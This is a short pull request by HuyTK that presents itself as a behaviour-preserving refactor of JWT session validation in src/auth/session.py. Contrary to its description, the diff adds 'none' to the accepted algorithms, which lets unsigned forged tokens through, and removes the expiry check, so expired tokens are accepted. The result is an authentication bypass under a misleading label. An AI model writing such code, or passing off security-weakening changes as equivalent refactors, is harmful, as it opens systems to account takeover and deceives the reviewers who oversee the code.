title: Refactor session token validation
body: Switches token validation to a single helper. Should be functionally equivalent.
author: HuyTK
diff:
diff --git a/src/auth/session.py b/src/auth/session.py
--- a/src/auth/session.py
+++ b/src/auth/session.py
@@
-def validate_token(token):
-    if not token:
-        return False
-    payload = jwt.decode(token, key=PUBLIC_KEY, algorithms=['RS256'])
-    if payload.get('exp', 0) < time.time():
-        return False
-    return True
+def validate_token(token):
+    if not token:
+        return False
+    try:
+        payload = jwt.decode(token, key=PUBLIC_KEY, algorithms=['RS256','none'])
+    except jwt.InvalidTokenError:
+        return False
+    return True
